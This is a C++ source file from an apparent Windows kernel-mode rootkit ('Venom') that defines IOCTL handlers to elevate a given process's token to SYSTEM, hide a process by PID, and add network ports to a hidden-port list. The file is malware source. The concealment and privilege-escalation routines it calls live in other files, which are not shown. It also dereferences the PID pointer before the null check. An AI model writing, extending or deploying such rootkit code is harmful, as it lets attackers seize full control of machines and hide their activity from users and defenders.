#include "IoctlHandlers.h"
#include "Process.h"
#include "Token.h"
#include "Capabilities/ProcessCapabilities/ProcessHider.h"
#include "Capabilities/TokenCapabilities/TokenElevator.h"
#include "TokenHandler.h"
#include "NetworkHandler.h"
#include "Venom.h"

NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
	//PEPROCESS Process;
	//PACCESS_TOKEN Token;
	auto status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);

	DbgPrint("Token Elevator: Received pid %lu", *pid);

	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	auto process = Process(*pid);
	auto token = Token(process);

	//status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);

	//if (!NT_SUCCESS(status)) {
	//	Irp->IoStatus.Information = 0;
	//	return status;
	//}
	//Token = PsReferencePrimaryToken(Process); // Get the process primary token.
	//TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.
	auto tokenElevator = TokenElevator(token);
	status = tokenElevator.elevate();

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	const auto stack = IoGetCurrentIrpStackLocation(Irp);

	const auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}
	auto process = Process(*pid);
	auto processHider = ProcessHider(process);
	status = processHider.hide();
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
	{
		return STATUS_INVALID_PARAMETER;
	}

	//Add the desired port to the list of hidden ports.
	auto size = sizeof(NetworkHandler::HiddenPort);
	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);

	if (portToHide == nullptr)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto ERROR;
	}
	
	portToHide->HiddenPort = NetworkHandler::htons(*port);
	NetworkHandler::addHiddenPort(&portToHide->Entry);

ERROR:
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}